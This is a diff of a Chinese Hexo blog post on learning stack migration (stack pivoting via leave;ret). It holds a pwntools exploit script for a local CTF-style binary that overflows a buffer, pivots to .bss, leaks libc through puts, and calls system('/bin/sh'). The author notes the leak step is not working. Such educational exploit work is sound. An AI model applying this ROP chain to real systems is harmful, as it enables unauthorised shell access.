@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="migration栈迁移其实就是利用 leave ret因为 leave ret 实际上就是 123mov    esp  ebp       pop  ebp       pop  eip  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 12345678910111213141516171819202122232425262728293031323334fro">
+<meta name="description" content="migration栈迁移其实就是利用 leave ret因为 leave ret 实际上就是   123mov    esp  ebp       pop  ebp       pop  eip  //一种清栈的行为  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 1234567891011121314151617181920212223242526272829">
 <meta property="og:type" content="article">
 <meta property="og:title" content="对于栈迁移技术的学习">
 <meta property="og:url" content="http://yoursite.com/2019/10/18/对于栈迁移技术的学习/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="migration栈迁移其实就是利用 leave ret因为 leave ret 实际上就是 123mov    esp  ebp       pop  ebp       pop  eip  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 12345678910111213141516171819202122232425262728293031323334fro">
+<meta property="og:description" content="migration栈迁移其实就是利用 leave ret因为 leave ret 实际上就是   123mov    esp  ebp       pop  ebp       pop  eip  //一种清栈的行为  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 1234567891011121314151617181920212223242526272829">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-24T13:54:12.678Z">
+<meta property="og:updated_time" content="2019-11-11T08:30:34.452Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="对于栈迁移技术的学习">
-<meta name="twitter:description" content="migration栈迁移其实就是利用 leave ret因为 leave ret 实际上就是 123mov    esp  ebp       pop  ebp       pop  eip  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 12345678910111213141516171819202122232425262728293031323334fro">
+<meta name="twitter:description" content="migration栈迁移其实就是利用 leave ret因为 leave ret 实际上就是   123mov    esp  ebp       pop  ebp       pop  eip  //一种清栈的行为  这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正 1234567891011121314151617181920212223242526272829">
 
 
 
@@ -396,8 +396,8 @@
       
 
       
-        <h3 id="migration"><a href="#migration" class="headerlink" title="migration"></a>migration</h3><p>栈迁移其实就是利用 leave ret<br>因为 leave ret 实际上就是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    esp  ebp</span><br><span class="line">       pop  ebp</span><br><span class="line">       pop  eip</span><br></pre></td></tr></table></figure>
+        <h3 id="migration"><a href="#migration" class="headerlink" title="migration"></a>migration</h3><p>栈迁移其实就是利用 leave ret<br>因为 leave ret 实际上就是  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    esp  ebp</span><br><span class="line">       pop  ebp</span><br><span class="line">       pop  eip  //一种清栈的行为</span><br></pre></td></tr></table></figure>
 
 <p>这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">pop1_ret = <span class="number">0x0804836d</span></span><br><span class="line">pop3_ret = <span class="number">0x08048569</span></span><br><span class="line"><span class="comment">#################### change stack space#####################</span></span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#################### leak libc address ########################</span></span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">puts_add = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_add - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address--&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line">system_add = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system address --&gt;[%s]"</span>%hex(system_add)</span><br><span class="line"><span class="comment">######################  get shell ###########################</span></span><br><span class="line">payload = p32(buf) + p32(read_plt) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + <span class="string">'bbbb'</span> + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -548,7 +548,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
